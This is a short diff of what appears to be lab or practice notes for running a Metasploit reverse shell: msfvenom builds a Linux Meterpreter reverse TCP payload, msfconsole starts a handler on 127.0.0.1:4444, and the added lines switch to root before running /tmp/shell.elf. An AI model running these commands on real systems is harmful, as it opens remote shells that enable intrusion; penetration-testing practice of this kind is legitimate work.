@@ -61,6 +61,8 @@ sudo msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f
 sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; set LPORT 4444; set ExitOnSession false; exploit -j"
 
 the below 2 lines in another terminal:
+sudo su
+(enter password)
 chmod +x /tmp/shell.elf
 /tmp/shell.elf &
 
